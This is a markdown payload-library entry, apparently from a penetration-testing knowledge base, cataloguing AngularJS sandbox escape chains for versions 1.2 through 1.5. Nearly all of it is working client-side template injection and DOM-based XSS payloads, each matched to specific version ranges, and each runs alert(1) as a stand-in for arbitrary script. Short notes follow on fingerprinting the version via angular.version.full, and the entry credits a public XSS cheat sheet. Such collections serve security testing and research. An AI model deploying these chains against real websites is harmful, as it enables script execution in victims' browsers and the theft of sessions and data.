---
title: AngularJS Sandbox Escape Chains (v1.2–v1.5)
slug: angular-sandbox-escapes
created_utc: 2026-05-12T00:00:00Z
updated_utc: 2026-05-12T00:00:00Z
tags: [payload, sink/dom-xss, sink/csti, sink/angularjs]
inbound: []
---

# AngularJS Sandbox Escape Chains (v1.2–v1.5)

## Payload

```javascript
// 1.2.0–1.2.1
{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
```

## Variants

```javascript
// 1.2.2–1.2.5 and 1.2.24–1.2.29 / 1.3.0–1.3.20 (reflected)
{{{}.")));alert(1)//"}}

// 1.2.6–1.2.18
{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}

// 1.2.19–1.2.23
{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}

// 1.3.3–1.3.18
{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)//');}}

// 1.3.19
{{'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join;$eval('x=alert(1)//');}}

// 1.3.20
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}

// 1.4.0–1.4.9
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}

// 1.5.0–1.5.8
{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}}

// DOM-based 1.2.27–1.2.29 / 1.3.0–1.3.20
{}.")));alert(1)//";

// DOM-based 1.4.0–1.4.5
'a'.constructor.prototype.charAt=[].join;[1]|orderBy:'x=1} } };alert(1)//';

// DOM-based 1.4.2–1.5.8
{y:''.constructor.prototype}.y.charAt=[].join;[1]|orderBy:'x=alert(1)'

// DOM-based 1.4.4 without strings
toString().constructor.prototype.charAt=[].join; [1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
```

## Context

Each payload targets a specific AngularJS sandbox version; the sandbox was iteratively patched between 1.2.0 and 1.5.8. All exploit prototype chain manipulation, `$eval`, or `Array.sort`/`orderBy` filter to reach `Function`. Version fingerprinting via `angular.version.full` is required before selecting the right chain. No user interaction needed. DOM-based variants are fed through the `orderBy` filter rather than reflected into mustache directly.

## Provenance

- Distilled from: `../../techniques/dom-xss/framework-vectors-angular.md`
- Original source: `../../sources/portswigger-xss-cheatsheet.md`

## Linked techniques

- [AngularJS Framework Vectors](../../techniques/dom-xss/framework-vectors-angular.md)
- [Client-Side Template Injection](../../techniques/dom-xss/client-side-template-injection.md)
